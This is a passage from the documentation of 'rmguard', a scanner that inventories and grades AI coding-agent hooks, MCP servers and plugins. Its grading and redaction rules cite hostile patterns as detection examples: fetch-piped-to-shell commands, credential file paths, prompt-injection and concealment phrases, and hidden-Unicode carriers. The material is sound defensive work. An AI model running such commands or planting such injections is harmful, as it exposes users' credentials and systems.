Connectors are inventory only. Finally, the directory names under
`~/.cache/claude-cli-nodejs/<project>/mcp-logs-<server>/` (macOS:
`~/Library/Caches/claude-cli-nodejs`) are listed as `mcp_observed_servers` (name, number
of projects, newest mtime); no log file is opened. A server that has run per those names
but matches no config, plugin or connector row is a Low advisory: it may be a connector
Claude Code no longer lists or a plugin since removed. `env` and `headers` blocks are
shown by shape only (`Authorization: Bearer ${API_KEY}`; a reference default becomes
`${KEY:-<redacted>}`, any literal `<redacted>`). The summary counts plugin servers and
connectors (`mcp_plugin_servers_count`, `mcp_connectors_count`) inside
`mcp_servers_count`. These rows are never probed: `--probe-mcp` stays limited to the
user's own config files.

The toxic-flow (lethal trifecta) finding is built from what is connected: successful
probes, MCP servers that are not marked off, mapped by a small closed table of well-known
names (Gmail, Drive, Calendar, Docs: private data; Playwright, browser, fetch: network
sink and untrusted content; filesystem; shell/exec), and the skills of the user and of
installed, enabled plugins. Marketplace clones of plugins that are not installed stay in
the inventory and supply nothing. The finding's evidence names the servers on each leg.

### Hook surfaces

Every hook is one `AgentHook` (`agent_settings[].hooks`, or `agent_skills[].hooks` for
frontmatter): framework, event, matcher, kind, the redacted command (exec-form argv in
`args`), and for the other kinds only what is safe to show. Formats are from the vendors'
own docs, fetched 2026-10-23; the URLs are in
[docs/THREAT-CATALOG.md](docs/THREAT-CATALOG.md#detection-techniques-and-their-sources).

| Agent | Files read | Kinds |
|---|---|---|
| Claude Code | `~/.claude/settings.json`, project `.claude/settings.json` / `settings.local.json`, managed settings and `managed-settings.d`; `statusLine`, `subagentStatusLine`, `fileSuggestion`; installed plugin versions (`installed_plugins.json` `installPath` under `~/.claude/plugins/cache/`): `hooks/hooks.json` (and its `modules`), `.claude-plugin/plugin.json` `hooks` (a `./path.json`, an inline map or an array of either; a path that does not start with `./` or leaves the plugin root is never read), root `settings.json` `subagentStatusLine`; plugins kept in a skills directory (`~/.claude/skills/<d>/.claude-plugin/plugin.json`, and a project's `.claude/skills/<d>/`); skill, command and subagent frontmatter (`~/.claude/agents/` and `.claude/agents/` walked recursively, as Claude Code scans them: real subfolders only, four levels and 64 folders at most) | command (+ `args`), http, prompt, agent, mcp_tool, module |
| Cursor | `~/.cursor/hooks.json`, project `.cursor/hooks.json`, enterprise `/etc/cursor/hooks.json` (macOS `/Library/Application Support/Cursor/hooks.json`), local plugins `~/.cursor/plugins/local/<p>/` with `.cursor-plugin/plugin.json` (manifest `hooks`, else `hooks/hooks.json`; a link out of the folder is skipped, as Cursor skips it) | command, prompt; `workspaceOpen` is noted as running outside any agent session |
| Codex | `~/.codex/hooks.json`, `~/.codex/config.toml` `[hooks]`, project `.codex/hooks.json` and `.codex/config.toml`, `/etc/codex/config.toml` and `/etc/codex/requirements.toml` `[hooks]` (managed), plugins under `~/.codex/plugins` (a directory with `.codex-plugin/plugin.json`, four levels down at most; manifest `hooks` replaces `hooks/hooks.json`); a plugin in the documented cache `cache/<marketplace>/<plugin>/<version>/` is `plugin@marketplace` (never the version directory, so two `local` plugins stay two), and one version per plugin is graded (`local`, else the highest version), the others inventoried inactive; `[features] hooks = false` (or the deprecated alias `codex_hooks = false`, which "still works") in the user or system `config.toml` marks every non-managed Codex hook disabled (`requirements.toml` decides when it sets the switch; a project config that sets `hooks = true` keeps them all graded) | command, mcp_tool (Codex parses prompt and agent handlers and never runs them, so they are not inventoried) |
| GitHub Copilot CLI | project `.github/hooks/*.json`, `.github/copilot/settings.json` / `settings.local.json` `hooks`, `~/.copilot/hooks/*.json`, `~/.copilot/settings.json`, `/etc/github-copilot/policy.d/*.json` (managed), `~/.copilot/installed-plugins/<marketplace>/<plugin>/` `hooks.json` or `hooks/hooks.json`; every hook configuration file must say `version: 1` ("Hook configuration files use JSON format with version `1`"); the settings files' `hooks` are read without a version, because the doc describes them separately as an "Inline `hooks` block in repository settings" and states no version for them (if Copilot does require one there, a versionless settings hook is an over-report); the command is `bash`, else `command`, else `exec` + `args`; a file-level `disableAllHooks: true` marks its hooks disabled, and a repository settings `disableAllHooks: true` marks that repository's hook files disabled too (policy hooks still run) | command, http, prompt |
| Gemini CLI | `~/.gemini/settings.json`, project `.gemini/settings.json`, `/etc/gemini-cli/{settings,system-defaults}.json` (macOS `/Library/Application Support/GeminiCli/`), extensions `~/.gemini/extensions/<e>/hooks/hooks.json` when `gemini-extension.json` exists; `mcpServers` produce no hooks (Gemini hooks are command-only); `hooksConfig.enabled: false` ("When disabled, no hooks will be executed") in the system settings, or in the user settings or system defaults with no project setting it back to `true`, marks every non-managed Gemini hook disabled | command |
| Devin Desktop (Windsurf) | project `.devin/hooks.json` (legacy `.windsurf/hooks.json` only when it is absent or empty), `~/.codeium/windsurf/hooks.json`, `~/.codeium/hooks.json`, `/etc/devin/hooks.json` (macOS `/Library/Application Support/Devin/`; legacy Windsurf system file only when the Devin one does not exist) | command |
| Devin CLI | project `.devin/hooks.v1.json` (the whole file is the map), `.devin/config.json` / `config.local.json` `hooks`, `~/.config/devin/config.json`, `~/.claude.json` `hooks` (Devin CLI reads it; no other key of that file is used) | command, prompt (handling undocumented: graded as conversation text) |
| OpenCode | project `.opencode/plugins/*` and `~/.config/opencode/plugins/*` (`.js`, `.mjs`, `.cjs`, `.ts`, `.mts`, `.cts`, `.jsx`, `.tsx`; one module hook per file, registered hook names found lexically), `opencode.json` `plugin` npm specs (names only, source not read) | module |
| Kiro | project `.kiro/hooks/*.json`, `~/.kiro/hooks/*.json` (`version: "v1"` only; `enabled: false` marks a hook disabled; `confirm.confirmCommand` is its own command hook) | command, agent (appended to the user prompt: conversation text) |

What is kept: a command hook's text redacted and sanitized (exec-form `args` redacted as
one line, so `["--token", "x"]` is redacted like `--token x`; a line break inside one
element is a space first, so it cannot separate a value from its flag); an http hook's
**host and scheme only** (`POST https://host`; never the path, query, userinfo,
`headers` or `allowedEnvVars`); a prompt's text redacted and capped, with a prose rule on top: after `password`, `passwd`, `passphrase`, `passcode`, `pw`, `pwd`, `secret`, `apikey`/`api key`, `x-api-key`, `token`, `credential(s)`, `Bearer` or `access code/key/token`, within the same clause, the first word after a separator (`is`, `:`, `=`, `(prod):`) is `<redacted>`, else the first value-shaped word (a digit, an inner capital or symbol, 16+ characters), so `the password for prod is X` hides X and `prints a token to the terminal` keeps "terminal"; after the weak words `key`, `pin`, `PAT`, `code` and `basic` the same rule applies; and the word after `login with <user> /` is `<redacted>`. Also: the plural words (`passwords`, `tokens`, `secrets`, `passphrases`; `keys` and `pass` as weak words), an environment-style name (`API_TOKEN X`, `DB_PASSWORD X`), the value before `as the password` (`use 'X' as the password`), a value-shaped word shortly after `login`/`log in`/`sign in`, and after `password:`/`passphrase:`/`secret:` every word to the end of the clause (`.`, `;` or a line break); a comma after a secret word does not end the search. Floor: prose redaction is a heuristic, it narrows what a prompt shows and cannot prove a prompt holds no credential (the prompt text is still shown, so a reviewer can read the evaluator's instructions); an all-lowercase short value after a secret word with no separator (`the password hunter`) is kept; an MCP tool hook's
`server / tool` (never `input`); a module's path or npm spec and the event names it
registers; Claude Code's `if` handler field (`Bash(git *)`, shown next to the matcher and
part of `--diff`; `if` "is only evaluated on tool events" and a hook with it on any other
event "never runs", so such a hook is inventoried disabled, except in
`.claude/settings*.json`, whose hooks Cursor, Copilot CLI and Devin CLI also run). Copilot `env` and `cwd` values are never read. Every displayed hook
field (command, argv, prompt, matcher, `if`, an unknown handler type, the mcp_tool
server and tool, module names) goes through the command-text redactor: the shared rules
(userinfo, `key=value`, secret-named flags, Authorization schemes, vendor key prefixes),
plus an `Authorization` header written as code (`fetch(u,{headers:{Authorization:'Bearer X'}})`, `"Authorization": "Bearer X"`: the value after the name, `:` and an optional quote, a scheme word kept, a bare `$VAR` kept), webhook URLs whose path is the credential (Slack `hooks.slack.com/services|workflows|triggers/`,
Discord `discord(app).com/api/[vN/]webhooks/`, Telegram `api.telegram.org/bot`, Teams
`webhook.office.com/webhookb2/`, Zapier catch hooks: host and prefix kept), `Cookie:` and
`Set-Cookie:` header values, the value after `--pass`, `--passwd`, `--pw`,
`--passphrase`, `--user-key`, `--app-token`, `--app-key`, `--bearer` and after `redis-cli -a` style
program flags, after `-p`/`--password` of a registry login (`docker|podman|helm ... login`; `docker run -p 8080:80` is a port and is kept), the VALUE of `npm|yarn|pnpm config set KEY VALUE` and `aws configure set KEY VALUE` when KEY names a credential (`_authToken`, `_auth`, `_password`, `npmAuthToken`, `aws_secret_access_key`, anything with secret/token/password), the path of a URL after `--webhook`/`--webhook-url`/`--hook-url`, and any
key-shaped word (24+ characters mixing letters and digits, not an identifier or path),
including one URL path segment at a time. Invisible carriers (Unicode tag characters,
supplementary variation selectors, a run of two or more BMP variation selectors U+FE00-FE0F not following an emoji or other non-ASCII character, soft hyphen, U+180E, Hangul fillers) are shown as `?`
in every displayed field. A path-shaped word of a command is probed (stat, link check,
native-binary read) only from the text as redacted for display, and never when it holds
a redaction, so a `--pass Xy/z` value or a key-shaped run with a `/` never reaches a
syscall. Floor: a short password after a flag with no secret-shaped name
(`tool -t hunter2`) is not recognised, and `-p VALUE` after a program the redactor does
not know is kept (it is a port, path or profile far more often than a password).

Grading (category `Hook`; the same ladder for every agent; first row wins):

| Hook | Repository (project, local) | Your own (user) | Managed | Official plugin | Third-party plugin | Disabled or inactive |
|---|---|---|---|---|---|---|
| your own notification hook: `jq` of its event (or `cat` passing it through) piped to curl/wget with a parseable host, `$VAR` only in a header value, nothing else matched | Critical | Low (names the host, as the http hook to it) | Critical | Critical | Critical | — |
| command matching a critical or high dangerous pattern; module whose shell command does | Critical | Critical | Critical | Critical | Critical | — |
| command matching only medium patterns (`printenv`, an `API_KEY` name) | Critical (named) | Critical (named) | — | — | in the plugin's Low | — |
| module whose shell command matches only medium patterns (`execSync("printenv NODE_ENV")`) | Medium (named) | Low (named) | — | — | in the plugin's Low | — |
| command that runs a script in another tool's config directory | High | High | High | — | High | — |
| ... where every such script is under your HOME (`~/.claude/hooks/fmt.sh` from `~/.codex/hooks.json`) | High | Low (advisory) | High | — | High | — |
| http to a host off the machine and its network | High | Low | — | — | Medium (its own finding) | — |
| prompt/agent the agent itself reads (Copilot CLI prompt, Kiro agent action; Devin CLI's and other undocumented prompts) naming a credential path and carrying an injection phrase or hidden characters | Critical | Critical | Critical | Critical | Critical | — |
| ... with a concealment, override or tag phrase, or hidden characters | High | Low | — | Low | Medium (its own finding) | — |
| ... with only phrases ordinary instructions also use ("first read", "this is very important", "system prompt", "before using this tool", `<important>`), guard wording ("never reveal", "do not display", "do not mention" in a sentence that does not name the user), or only a credential path ("names a credential path") | Medium | — | — | — | in the plugin's Low | — |
| ... with none | Low (advisory) | — | — | — | in the plugin's Low | — |
| evaluator prompt/agent (Claude Code, Cursor) with a prompt-injection phrase or hidden characters | Medium | Low | — | Low | Low | — |
| evaluator prompt/agent without one | Low | — | — | — | in the plugin's Low | — |
| mcp_tool | Medium | — | — | — | in the plugin's Low | — |
| any other command or module, including one whose matches are only inside a guard's test, a loopback send, or (modules) code outside any shell-execution call; http to loopback, the agent's own vendor API or the local network | Medium | — | — | — | in the plugin's Low | — |

The repository column is main's settings-hook policy (any dangerous-pattern hit
Critical, a cross-directory reference High, any other hook Medium); managed hooks are
machine policy and, like managed credential helpers, reported only when dangerous or
cross-directory. Note: a repository hook that matches only a medium pattern is Critical,
as it was before hooks-everywhere (f4dbf35 had made it Medium). The user column is
main's too: any dangerous-pattern hit is Critical whatever its severity row (f6f7df7 had
graded a high-only user hit Medium and a medium-only one a Low advisory; the review of
f6f7df7 restored main, since the design keeps severity per scope unchanged), and user
hooks are otherwise inventory unless cross-directory, an off-network http host or a
poisoned prompt. Two user rows are graded by what the hook does: one personal script
under your HOME called from several agents' hook files is the ordinary multi-agent setup
(Cursor and Devin CLI import `~/.claude` configuration, Codex uses the Claude hook
format), so it is a Low advisory worded "cross-references another agent's config
directory in your home", while a repository's hook reaching there, or a user hook naming
a repository-relative `.vscode/` script, stays High ("the Shai-Hulud persistence
pattern"); and a push notification (`jq -r .message | curl -s -d @- ntfy.sh/topic`: a
jq of the hook's own stdin, or a bare `cat` passing the event JSON through, no file,
`env` or `$` other than a plain `$NAME` in a header value such as an authenticated
topic's `Authorization: Bearer $NTFY_TOKEN`, a body from stdin or a literal, one host, no
proxy, config file or `@file` upload) sends no more than an http hook to the same host
and is graded like it (Low, naming the host, and not marked DANGEROUS in the inventory);
a credential path, the environment, a fetch piped to a shell or an obfuscated match
stays Critical. A repository's hook that runs a script the same git work tree keeps in
its own `.claude/`, `.cursor/`, `.codex/` or `.gemini/` directory (`.cursor/hooks.json`
running `.claude/hooks/check-style.sh`, which Cursor runs from `.claude/settings.json`
anyway, cursor.com/docs/reference/third-party-hooks) is that repository's plain hook
(Medium, worded "runs a script this repository keeps in its .claude/ directory"); a
`.vscode/` script, another directory, or a path out of the work tree keeps High. Every graded command
title names the patterns it matched. Flag, program and code rows match whole tokens:
`--no-verify` only as its own flag (not `--no-verify-ssl-warnings`), `nc -l` only as its
own program (not `rsync -l`), `subprocess`, `child_process` and `os.system` only as code
tokens (not `no_subprocess_guard.py`, `subprocess_tools.lint` or `hooks/subprocess.py`),
`eval(` and `exec(` only after a non-identifier character; name rows (`API_KEY`,
`GITHUB_TOKEN`) stay substrings. A pattern that appears only as the argument of a
guard (`grep`, `egrep`, `fgrep`, `rg`, `ag`, `test`, `[`, `[[`, with no command
substitution in it: `jq -r .tool_input.command | grep -q -- '--no-verify' && exit 2`), in
a `case` pattern (`case "$cmd" in *--no-verify*) exit 2;; esac`; the clause bodies are
still checked), in the filter of a jq stage that only tests its input (no `env`,
`$ENV`, `input`, file operand or `--rawfile`, its output piped nowhere:
`jq -e '.tool_input.command | test("--no-verify")' && exit 2`), in the string literals of
a `python -c` whose code only computes `sys.exit` (no `os`, `subprocess`, `open`,
`eval`, `exec`, `urllib`, `socket`, ...), behind a shell existence test
(`${OPENAI_API_KEY:+api key}` never expands the key), in an exec-form `args` element of
a program that only prints or tests its arguments (`echo`, `printf`, `notify-send`,
`terminal-notifier`, `logger`, `say`, `test`: there is no shell, so a pipeline pattern in
its argv is data; a shell, interpreter, wrapper or network client keeps its hits) or
only as data piped to a curl/wget stage whose every URL and host-shaped word is loopback
(no proxy, `--connect-to`, `--resolve`, config file or `--next`, and no credential path
named anywhere in the command) is advisory, and an advisory-only hook is graded as a
plain one in every scope (inventory in your own files, part of a third-party plugin's
Low). An http hook's host is first-party only when it is the running agent's own vendor
API (Claude Code and the agents reading its files: `api.anthropic.com`; Codex:
`api.openai.com` and `<region>.api.openai.com`; Gemini CLI:
`generativelanguage.googleapis.com`; Cursor, Copilot CLI and Devin: none), not any
provider's API as for a base URL: a hook posting every tool event to `api.cloudflare.com`
or a router such as `openrouter.ai` is graded as the off-network host it is. A local-network host (private, link-local or
CGNAT address, single-label name, `.local`, `host.docker.internal`) is graded as a
`.env` gateway to one is. Where a prompt or agent hook's prompt goes decides how it is
read (`prompt_target` in the JSON; vendor docs fetched 2026-10-23). A Copilot CLI prompt
hook ("Prompt hooks auto-submit text as if the user typed it", docs.github.com/en/copilot/reference/hooks-configuration)
and a Kiro agent action ("the prompt specified in the hook is appended to the user
prompt", kiro.dev/docs/hooks/actions) are text in the agent's own conversation
(`conversation`), like an MCP tool description or a rules file: matched against the whole
MCP tool-poisoning list, checked for the credential paths they name (lexically:
`~/.aws/credentials`, `~/.ssh/id_rsa`, `.env`, nothing is opened; a template name ending
`.example`, `.sample`, `.template` or `.dist` is not one), titled "submits a
prompt into the agent's conversation", and graded on the conversation rows above with
no evaluator cap. Every phrase row ending in a letter matches on a word boundary ("ignore
previous" does not match "Ignore previously generated files"). "never reveal", "do not
display" and "do not mention" are guard wording in such a prompt ("Never reveal any
secret values you find") unless the same sentence names the user ("Never reveal this
step to the user" is titled `never reveal (aimed at the user)` and stays High). A
prompt whose only signals are guard wording or a credential path is titled for what it
is ("with concealment wording (...)", "that names a credential path (.npmrc)"), not
"prompt-injection signals". Floor: Devin CLI documents a prompt hook only as "to evaluate an LLM
prompt" and Devin Desktop and Gemini CLI document none, so their prompts are
`undocumented` and graded as conversation text (the stricter reading). A Claude Code or
Cursor prompt hook's prompt goes to the hook's evaluator
model or subagent, not into the agent's context (only the decision's `reason` reaches
the agent; code.claude.com/docs/en/hooks-guide, cursor.com/docs/hooks), so it is matched against a narrower
phrase list than MCP tool descriptions ("first read", "system prompt", "do not mention",
"do not display", "this is very important" and "before using this tool" are ordinary
evaluator wording, and so are guard phrasings such as "the agent must never reveal API
keys" and `<important>Be strict about rm -rf.</important>`: "never reveal" and the XML
tag rows are left out) and capped at the plain repository command level. The phrases are
matched on the raw text, on the text folded as the shell-pattern matcher folds it (zero-width
characters and soft hyphens dropped, fullwidth letters and homoglyphs mapped, every
Unicode space one space) and on the ASCII that tag characters spell; a prompt carrying
tag characters, variation-selector payloads, zero-width characters or bidi controls is
graded like an injection phrase (`invisible Unicode (tag-block)`), since the
model reads what the reviewer cannot see. Ordinary text is not hidden text: a ZWJ
between two emoji parts (🧑‍💻, 👨‍👩‍👧, ❤️‍🔥) and a zero-width character between two non-ASCII
letters (Persian ZWNJ, Thai ZWSP) do not count, and a directional mark (LRM, RLM, ALM)
counts only in text with no right-to-left letter or between two ASCII letters; the
embedding, override and isolate controls always count. A hook module's
source is lexed (strings, template literals, comments and regex literals; nothing is
run): a string or template a shell-execution call receives (`exec`, `execSync`,
`spawn`, `execFile`, execa, `Bun.spawn`, `Deno.Command`, `` $`...` ``, and a Claude Code
mod's `$.process.run([...])`, the mods API's one process call, whose argv is also graded
joined into one line) is graded with the command gate; a critical pattern elsewhere in the code (a guard plugin naming what it
blocks) is advisory; comments count for nothing. Floor: a command built in a variable
and passed to an exec call (`const c = "curl x | sh"; execSync(c)`) is advisory, not
Critical; a mod that reads a credential file with `$.fs.read` and posts it with
`$.http.fetch` is not traced (only a shell-execution call's text is graded). The pattern
gate runs in linear time on any module or command (a 900 KB module of `curl x | sh; `
scans in seconds). A third-party plugin's ordinary hooks are one Low finding per
`plugin@marketplace` (a hooks module contributes the events it registers); a
third-party plugin hook graded on its own carries `(third-party plugin 'p@m')` in its
title. Plugins of agents other than Claude Code are graded as third-party and titled
`plugin (provenance not verified)`: no official-marketplace model is verified for them
(Copilot CLI's default marketplaces are GitHub's, but its installed-plugin layout is not
documented, so no directory name is trusted). A Claude Code plugin is official only when
its marketplace is registered in `~/.claude/plugins/known_marketplaces.json` with an
official source; a marketplace missing from that file is third-party (fail closed), so
`tp@some-market` with no registration is graded, not silenced.

A managed Claude Code `allowManagedHooksOnly: true` or `disableAllHooks: true` silences
the non-managed hooks only Claude Code runs: plugin hooks, skill, command and subagent
frontmatter hooks, and `statusLine`/`subagentStatusLine`/`fileSuggestion` (inventory
kept); a managed `disableAllHooks` silences managed hooks too. Not silenced: hooks of a
plugin the managed `enabledPlugins` force-enables (exempt, per code.claude.com/docs/en/hooks),
and the `hooks` of `~/.claude/settings.json`, a project's `.claude/settings.json` and
`.claude/settings.local.json`, which Cursor (cursor.com/docs/reference/third-party-hooks,
"on by default"), GitHub Copilot CLI (the repository's two) and Devin CLI
(docs.devin.ai/cli/extensibility/hooks/overview, `read_config_from.claude` default) also
run, unbound by Claude Code's policy; those keep their grade with the note `(Claude Code
skips it under the managed allowManagedHooksOnly; Cursor, GitHub Copilot CLI and Devin
CLI still run this file's hooks)`; for `~/.claude/settings.json` the note names Cursor and
Devin CLI, and for `~/.claude/settings.local.json` Devin CLI only (Cursor documents no
user-level `settings.local.json`). Each silenced hook is marked `disabled` with
`disabled_reason` `managed allowManagedHooksOnly` (or `managed disableAllHooks`), so the
inactive count, the terminal, HTML and Blueprint agree with the grading. A user `disableAllHooks` silences nothing (a project
file can turn it back off). A disabled plugin, a marketplace clone or an orphaned cache
version is never visited or is inventory only; the summary's `agent_hooks_inactive_count`
(terminal: "of which inactive") counts the inventoried hooks that never run,
`agent_settings_commands_count` (terminal: "of which settings commands") the
`statusLine`/`subagentStatusLine`/`fileSuggestion` commands counted with the hooks
(code.claude.com/docs/en/statusline: settings commands, not hooks), and the
HTML and Blueprint show `(disabled)` (with its reason) and an inactive plugin as the terminal does; a
hook that never runs (disabled, or shipped by an inactive plugin) declares no Blueprint
behaviour. A settings command has its own `kind`, `settings-command` (terminal: `(settings-command)`),
set only where the setting is read, so a hooks-map event that happens to be named
`statusLine` is an ordinary hook and is not counted as one; `--diff` treats the kind as
derived and compares it equal to a baseline without it. A plugin's hook files are one
inventory entry each (`hooks/hooks.json`, a manifest's `./config/hooks.json`, the
manifest's inline map), so the inventory and `--diff` name the file to edit. A module
hook finding is titled with its framework (`opencode hooks module ...`, `claude-code mod
hooks module ...`), and the terminal row shows `registers=[...]`. A path into the hook's
own agent directory is worded by position: `runs a script stored in .claude/` for a
program (or an interpreter's script), `references a path in .claude/` for an argument
(a log file, a markdown file it reads), and a repository hook reaching into your HOME's
agent directory (`>> ~/.claude/bash.log`) `reaches into your home's .claude/ directory`.

Files are opened as settings files are: repository files with `O_NOFOLLOW`, a link at
any depth below the repository (`.github/hooks/x.json -> ~/.aws/credentials`,
`.kiro/hooks -> ../../elsewhere`) inventoried by its link text and never followed out;
user, managed and plugin files read through a link only when its lexical and real target
are not a credential, key, agent-config, system or other-user path outside the agent's
own directory, judged against both `$HOME` and the home being scanned. An agent credential or state file (`~/.codex/auth.json`, `~/.gemini/oauth_creds.json` and `google_accounts.json`, `~/.claude/.credentials.json`, `~/.copilot/config.json` and `~/.copilot/mcp-oauth-config/`) is never opened through a link, even inside its own agent home (`~/.codex/hooks.json -> auth.json` is inventoried, not read). A user hook or settings file linked into another agent's directory in the same home (`~/.codex/hooks.json -> ../.claude/codex-hooks.json`, one hook setup shared by two agents) is not read and is a Low advisory naming the link; every format shows `symlink to <link text>, not read` on its inventory row (a `--search-dirs`
home's `.gemini/settings.json -> .docker/config.json` is inventoried, not opened); a plugin file whose real path leaves the plugin is never read (Claude
Code refuses it too). A plugin, extension or installed-plugin root that is itself a
symlink (or sits under one) is judged on its real path: into a credential, system or
other-user path it is inventoried by that target and nothing under it is read; to your
own files (a plugin checkout) it is read. A repository's hooks or plugins directory
whose real path leaves the repository (`.kiro/hooks -> ~/.config/gcloud`) is one
inventory entry by its link text and is not listed. A command whose script is a symlink leaving its project or plugin
is noted (`runs a file that is a symlink leaving its plugin`), never opened; a project's
files are contained by its enclosing git work tree, as its skill links are.

Floors (documented but not read):
- Claude Code: inline hooks in a marketplace entry (`marketplace.json` `plugins[].hooks`), link-mode and local-path plugins (an `installPath` outside the cache), `~/.claude/dev-mods` session mods, `CLAUDE_CODE_PLUGIN_CACHE_DIR` relocation, plugin monitors, and data flows inside a mod that use no process call (`$.fs.read` of a credential then `$.http.fetch`).
- Cursor: team hooks (cloud-distributed, not on disk as configuration) and installed marketplace plugins (their on-disk location is not documented).
- Codex: intermediate project config layers between the repository root and the cwd, `commandWindows` (not pattern-checked), and plugin activation in `config.toml` `[plugins."p@m"] enabled` (every cached plugin's graded version is treated as active).
- Copilot CLI: `COPILOT_HOME` relocation, Windows registry policies, and agent-scoped hooks in custom-agent frontmatter.
- Gemini CLI: `GEMINI_CLI_SYSTEM_SETTINGS_PATH` and the `hooksConfig.disabled` per-hook list.
- Devin: plugin hooks (install location undocumented), ancestor-directory discovery between the repository root and the cwd, and dashboard-distributed enterprise hooks.
- OpenCode: npm plugin package sources (installed by Bun into `~/.cache/opencode`).
- Kiro: legacy IDE `*.kiro.hook` files and CLI 2.x profile-scoped hooks.
- Claude Code: an `asyncRewake` hook's `rewakeMessage` and `rewakeSummary` text (used by the official security-guidance plugin; code.claude.com/docs/en/hooks documents `asyncRewake` but not these fields, fetched 2026-10-23) is not read or graded; if they are documented as text put in the agent's context, they will be graded as conversation text.
- Everywhere: Windows paths (`%APPDATA%`, `ProgramData`).
- Budgets: at most 500 hooks per file entry and per plugin (a plugin manifest's list of hook files is read once per path and only until the plugin's cap) and 10,000 per scan; hooks past either are not parsed (the file is counted as a miss in the diagnostics and traced as "hook budget spent" under `--trace`). The on-disk checks of one command (native-binary probe, symlink check) stop after 16 path words, program words first, and after 20,000 per scan; the lexical agent-directory check still sees every word.

A built-in **threat catalog** (228 entries; its version, the date of its last change, is in `rmguard --version` and the JSON report's `catalog` block) flags known-malicious or known-vulnerable
packages, MCP servers, IDE plugins and browser extensions during the scan — and, via the
`agent-runtime` ecosystem, checks the **agent's own version** (Claude Code, Claude
Desktop/Cowork, Codex CLI, Copilot CLI, Gemini CLI, Goose, Kiro IDE, Ollama) against
known-vulnerable ranges, since agent runtimes are now CVE-bearing packages in their own
right. Each key names exactly one product version line, so a desktop advisory can never
match a CLI version. Every entry cites its source; every ecosystem in the catalog
is guaranteed by test to be reachable from a scanner, so a row can never sit unmatchable
while reading as coverage. See [docs/THREAT-CATALOG.md](docs/THREAT-CATALOG.md) for
sources and attribution.

## Output Formats

- **`terminal`** (default) — Risk-first: a ranked Security Findings section, then the inventory with status indicators (● running, ○ stopped)
- **`json`** — Structured data for programmatic consumption, CI pipelines, or SIEM ingestion (round-trippable — it deserializes back into a scan report). Includes per-scanner `diagnostics`
- **`html`** — **Risk-first** dark-themed report: severity pills, a ranked Security Findings section, then inventory + detail. Meant to be shared/archived. Each finding is **click-to-expand**: it reveals what it means, why it matters, how to fix it, the framework it maps to (EAA / OWASP / etc.), and — where relevant — the exact offending artifact (e.g. the actual shell command a hook runs, with any credential in it redacted). Self-contained (no external assets), so it renders offline and travels as a single file
- **`sbom`** — CycloneDX 1.6 SBOM
- **`blueprint`** — CycloneDX 2.0 Blueprint (draft) — agent posture as assets/behaviors/flows plus a native risk layer: threats (with CVE `vulnerabilities` and CAPEC `attackPatterns`), a scored toxic-flow risk, and compliance controls, schema-validated in CI. New to Blueprints? [docs/BLUEPRINT-WALKTHROUGH.md](docs/BLUEPRINT-WALKTHROUGH.md) explains the output field by field
- **`compliance`** — control-coverage report (see below)

## Compliance evidence

`--format compliance` maps rmguard's inventory and findings to the control frameworks
organizations are being asked to satisfy for AI-agent / MCP security, and reports honest
coverage (Covered / Partial / Out-of-scope) per control:

- **NSA/CISA "MCP Security" CSI** (U/OO/6030316-26, 2026-06)
- **OWASP Top 10 for Agentic Applications** (ASI01–ASI10) and **Agentic Skills Top 10** (AST)
- **OWASP MCP Top 10** (MCP)
- **EU AI Act** AI-component inventory / transparency obligations (applicable since 2026-08-02). The Chapter III *high-risk* obligations were deferred by the Digital Omnibus (Regulation (EU) 2026/1744) to 2027-12-02 / 2028-08-02 — this mapping covers the inventory/transparency bucket only.
- **[Endpoint AI Agent Abuse (EAA)](https://github.com/0x4D31/endpoint-ai-agent-abuse)** — the closest-fit framework (endpoint agent abuse specifically); rmguard covers 8 of its 16 techniques outright and partials several more. CC0, by 0x4D31.

This is posture **evidence** (inventory + detection), **not a compliance attestation** —
runtime controls (invocation logging, network segmentation) are explicitly marked
out-of-scope. Every finding category the tool emits maps to at least one control, and
every mapped category is a real finding category; both directions are tested. It's the
artifact you bring to a compliance program to demonstrate agent/MCP inventory and
detection coverage, with each finding tied to the control it evidences.

## Team / fleet reporting

Run per-machine scans, collect the JSON however your team already moves files (MDM,
a shared drive, CI artifact, S3, a git repo), then aggregate into one dashboard:

```bash
# On each machine (cron, MDM, or manual):
rmguard --format json --output /shared/scans/$(hostname).json

# Anywhere the JSONs are collected:
rmguard --report /shared/scans/ --output fleet.html
```

`fleet.html` ranks machines by the severity of their findings (most at-risk first),
shows fleet-wide critical/high/medium totals, and links to each machine's findings.
The aggregator only reads the JSON files — it's agnostic about how they got there.

To **gate** on posture instead of just reporting it — a pre-commit hook, an onboarding
check, or a CI step that must fail a machine with serious findings — use `--fail-on`:

```bash
# Exits 2 (report still prints) if any Critical finding is present; else 0.
rmguard --fail-on critical || echo "machine failed its security gate"
```

Operational errors exit 1, findings-at-threshold exit 2, clean exits 0 — so scripts can
tell "the scan couldn't run" from "the scan found something."

### Debugging a scan

A scanner that finds nothing looks the same whether the machine is clean or the scanner
looked in the wrong place. `--verbose` appends a diagnostics table that tells them apart:

```
  ── Scanner Diagnostics ──
  scanner            ms   read  missing  items  status
  packages            0      1        8      0  ok  (/home/me)
  gitconfig         332     44        0      0  ok  (/home/me)
  notebooks           0      0        0      0  no inputs
  mcp-probe           0      0        0      0  skipped
```

`read` and `missing` count the files and directories a scanner opened or looked for
(a directory that exists but cannot be listed is a miss, not silence); the opt-in phases
(`mcp-probe`, `registry`) show as `skipped` unless their flag was passed; `no inputs`
means it opened nothing and produced nothing — either this machine has none of what it
looks for, or it is looking in the wrong place. `--trace` (or `RMGUARD_TRACE=1`) then
prints every path as it is tried, redacted and sanitized. The same numbers are in
`--format json` under `diagnostics`, so a fleet aggregator can spot a scanner that
silently stopped working across machines. A scanner that stopped at a walk budget (the
gitconfig nested-repository walk, the skills bundle walk) is marked `partial` in the
table and `"truncated": true` in its JSON row: its results may be incomplete.
`--walk-budget N` sets the budget: N directories per project for the gitconfig walk
(default 25,000), with the skills bundle walk's file and entry caps (default 31,250 and
312,500) and the transcript file counts (default 125,000) scaled in the same ratio; a
larger budget trades scan time for coverage (the nested walk costs on the order of
10 ms per thousand directories on one thread, warm cache), and a walk that still reaches it stays `partial`.

The scanners of each phase run side by side (`--jobs`, default the machine's available
parallelism, at most 8), and the global phase and the primary home pass share one pool of
that many threads, so the two phases overlap (extra `--search-dirs` passes follow, one at
a time; each scans its home and that home's projects,
while the current working directory is a project of the primary pass only, and no pass
treats any scanned home, or an ancestor of one, as a project); the report, including the order of every list and every diagnostics count, is
the same whatever the job count. Two scanners also split their own work over the same
number of threads: `gitconfig` walks each registered project for buried git directories
on its own thread (each project keeps its own `--walk-budget` of directories), and `skills`
